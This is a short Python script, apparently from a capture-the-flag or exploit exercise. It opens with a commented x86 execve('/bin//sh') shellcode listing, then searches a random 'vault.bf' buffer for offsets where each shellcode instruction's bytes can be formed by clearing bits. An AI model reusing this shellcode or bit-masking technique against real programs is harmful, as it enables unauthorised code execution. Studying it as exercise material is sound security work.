# 50               push    eax
# 68 2F 2F 73 68   push    'hs//'
# 68 2F 62 69 6E   push    'nib/'
# 89 E3            mov     ebx, esp
# 50               push    eax
# 53               push    ebx
# 89 E1            mov     ecx, esp
# B0 0B            mov     al, 0Bh
# CD 80            int     80h        

def new_bf():
    f = open('/dev/urandom','rb')
    buf = f.read(1125)
    f.close()
    f = open('./vault.bf','wb')
    f.write(buf)
    f.close()
    return buf

def load_bf():
    f = open('./vault.bf','rb')
    buf = f.read(1125)
    f.close()
    return buf

def print_bits(buf, seq, pos):
    print ("Offset: %d"%pos)
    print ("  "+"".join(["%.2x"%ord(x) for x in seq]) + " : " +  " ".join([bin(ord(x)) for x in seq]))
    print ("  "+"".join(["%.2x"%ord(x) for x in buf[pos:pos+len(seq)]]) + " : " +  " ".join([bin(ord(x)) for x in buf[pos:pos+len(seq)]]))

def search(buf, seq):
    for i in range(len(buf)-len(seq)+1):
        for j in range(len(seq)):
            if ((ord(buf[i+j]) & 2**0) and (not (ord(seq[j]) & 2**0))): break 
            if ((ord(buf[i+j]) & 2**1) and (not (ord(seq[j]) & 2**1))): break 
            if ((ord(buf[i+j]) & 2**2) and (not (ord(seq[j]) & 2**2))): break 
            if ((ord(buf[i+j]) & 2**3) and (not (ord(seq[j]) & 2**3))): break 
            if ((ord(buf[i+j]) & 2**4) and (not (ord(seq[j]) & 2**4))): break 
            if ((ord(buf[i+j]) & 2**5) and (not (ord(seq[j]) & 2**5))): break 
            if ((ord(buf[i+j]) & 2**6) and (not (ord(seq[j]) & 2**6))): break 
            if ((ord(buf[i+j]) & 2**7) and (not (ord(seq[j]) & 2**7))): break 
        else:
            if (j == len(seq)-1):
                print_bits(buf, seq, i)


buf = load_bf()

print ('--------------------------------------------------')
print ('-->  push   "hs//"')
search(buf, '\x68\x2f\x2f\x73\x68')
print ('--------------------------------------------------')
print ('-->  push   "nib/"')
search(buf, '\x68\x2f\x62\x69\x6e')
print ('--------------------------------------------------')
print ('-->  mov ebx, esp')
search(buf, '\x89\xe3')
print ('--------------------------------------------------')
print ('-->  mov ecx, esp')
search(buf, '\x89\xe1')
print ('--------------------------------------------------')
print ('-->  mov  al, 0b')
search(buf, '\xb0\x0b')
print ('--------------------------------------------------')
print ('-->  int 80')
search(buf, '\xcd\x80')


# print_bits(buf, "\xeb\xff", 1005)
